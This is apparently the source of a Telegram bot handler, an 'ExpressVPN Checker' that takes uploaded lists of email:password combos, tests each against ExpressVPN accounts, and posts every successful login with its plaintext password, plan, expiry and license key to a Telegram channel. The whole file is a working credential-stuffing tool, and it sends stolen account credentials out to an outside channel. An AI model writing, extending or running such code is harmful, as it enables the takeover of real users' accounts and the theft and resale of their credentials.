// api/telegram.js – ExpressVPN Bot (simple, like 10 Minute School)
import { checkExpressVPN } from '../lib/expressChecker.js';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const body = req.body;
  if (!body.message) return res.status(200).json({ ok: true });

  const chatId = body.message.chat.id;
  const text = body.message.text;
  const document = body.message.document;

  // ===== /start =====
  if (text === '/start') {
    await sendMessage(chatId,
      "🤖 *ExpressVPN Checker Bot*\n\n" +
      "Send a `.txt` file with combos:\n" +
      "`email:password` (one per line)\n\n" +
      "I'll check them one by one and forward HITs to the channel."
    );
    return res.status(200).json({ ok: true });
  }

  // ===== File upload =====
  if (document && document.mime_type === 'text/plain') {
    // 1. ফাইল ডাউনলোড
    const fileUrl = await getFileUrl(document.file_id);
    if (!fileUrl) {
      await sendMessage(chatId, "❌ Failed to get file.");
      return res.status(200).json({ ok: false });
    }

    const fileContent = await downloadFile(fileUrl);
    if (!fileContent) {
      await sendMessage(chatId, "❌ Failed to download file.");
      return res.status(200).json({ ok: false });
    }

    // 2. কম্বো পার্স
    const lines = fileContent.split(/\r?\n/);
    const combos = [];
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      const idx = trimmed.indexOf(':');
      if (idx === -1) continue;
      const user = trimmed.slice(0, idx).trim();
      const pass = trimmed.slice(idx + 1).trim();
      if (user && pass) combos.push({ username: user, password: pass });
    }

    if (combos.length === 0) {
      await sendMessage(chatId, "❌ No valid combos found (format: email:password)");
      return res.status(200).json({ ok: false });
    }

    // 3. টেলিগ্রামকে তাৎক্ষণিক রেসপন্স (টাইমআউট এড়াতে)
    res.status(200).json({ ok: true });

    // 4. ব্যাকগ্রাউন্ডে প্রসেসিং
    setTimeout(() => processCombos(chatId, combos), 100);
    return;
  }

  return res.status(200).json({ ok: true });
}

// ===== প্রসেসিং (সিরিয়াল, 300ms ডিলে) =====
async function processCombos(chatId, combos) {
  const total = combos.length;
  let hits = 0;
  const startTime = Date.now();

  await sendMessage(chatId, `📥 Received ${total} combos. Checking one by one...`);

  for (let i = 0; i < combos.length; i++) {
    const combo = combos[i];
    const result = await checkExpressVPN(combo.username, combo.password);

    if (result.hit) {
      hits++;
      await forwardToChannel(result);
    }

    // প্রতি ৫টি বা শেষে প্রগ্রেস
    if ((i + 1) % 5 === 0 || i + 1 === total) {
      await sendMessage(chatId, `⏳ Progress: ${i + 1}/${total} | HITs: ${hits}`);
    }

    // 300ms ডিলে (10MS-এর মতো)
    await new Promise(r => setTimeout(r, 300));
  }

  const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
  let summary = `✅ *Checking complete!*\nTotal: ${total}\n🔥 HITS: ${hits}\n⏱️ Time: ${elapsed}s`;

  await sendMessage(chatId, summary);
}

// ===== হেল্পার ফাংশন =====
async function sendMessage(chatId, text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'Markdown'
      })
    });
  } catch (e) {}
}

async function getFileUrl(fileId) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${fileId}`;
  try {
    const res = await fetch(url);
    const data = await res.json();
    if (data.ok && data.result.file_path) {
      return `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${data.result.file_path}`;
    }
  } catch (e) {}
  return null;
}

async function downloadFile(fileUrl) {
  try {
    const res = await fetch(fileUrl);
    return await res.text();
  } catch (e) {
    return null;
  }
}

async function forwardToChannel(result) {
  if (!TELEGRAM_CHAT_ID) return;
  const message = `🎯 *ExpressVPN HIT*\n\n` +
                  `📧 *Email:* ${result.email}\n` +
                  `🔑 *Password:* \`${result.password}\`\n` +
                  `📋 *Plan:* ${result.plan || '—'}\n` +
                  `📅 *Expiry:* ${result.expiry || '—'}\n` +
                  `🔑 *PC Key:* ${result.pcKey || '—'}\n` +
                  `📅 *Key Expiry:* ${result.keyExpire || '—'}\n` +
                  `📌 *Status:* ${result.keyStatus || '—'}\n\n` +
                  `#ExpressVPN @SHAKIB2016`;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
  } catch (e) {}
}
